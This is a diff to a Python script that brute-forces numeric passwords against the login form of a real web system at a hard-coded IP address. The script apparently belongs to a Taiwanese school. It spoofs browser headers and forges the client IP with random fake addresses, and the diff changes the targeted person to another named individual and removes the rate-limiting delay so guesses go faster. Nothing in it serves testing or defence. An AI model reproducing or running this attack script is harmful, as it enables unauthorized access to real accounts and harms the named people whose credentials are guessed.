@@ -1,9 +1,13 @@
-import requests,os,random,time
+from datetime import datetime, timedelta, timezone
+
+import requests
 from fake_useragent import UserAgent
+
 ua = UserAgent()
-from faker import Faker  
+from faker import Faker
+
 faker = Faker()
-passwd = 205459
+passwd = 10063
 
 while True:
 	header = {'User-Agent':ua.chrome,'Upgrade-Insecure-Requests':'1','Referer':'http://140.126.151.12/csnskj/Permain.asp','Origin':'http://140.126.151.12','Host':'140.126.151.12','Content-Type':'application/x-www-form-urlencoded','Content-Length':'169','Connection':'keep-alive','Cache-Control':'max-age=0','Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate'}
@@ -29,7 +33,7 @@ while True:
     'LEVEL':'0',
     'REMOTE_HOST':str(faker.ipv4()),
     'txtT_NO':'',
-    'txtName':'吳俊翰'.encode('big5'),
+    'txtName':'金雪玲'.encode('big5'),
     'txtPass':spasswd
     },headers=header,allow_redirects=False)
 	r.encoding = 'big5'
@@ -39,7 +43,7 @@ while True:
 		file = open('passwd.txt','a+')
 		file.write(str(spasswd)+'\n')
 		file.close()
-		print('passwd is ' +passwd)
+		print('\n passwd is ' +spasswd)
 		break
 	else:
     	#not yet
@@ -47,5 +51,9 @@ while True:
 		file.write(str(spasswd)+'\n')
 		file.close()
 		passwd += 1
-		print("\r Running...."+spasswd,end = "")
-		time.sleep(0.5)
+		dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
+		dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
+		twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
+		print("\r Running...."+spasswd+",Taiwan Time:"+twt,end = "")
+
+
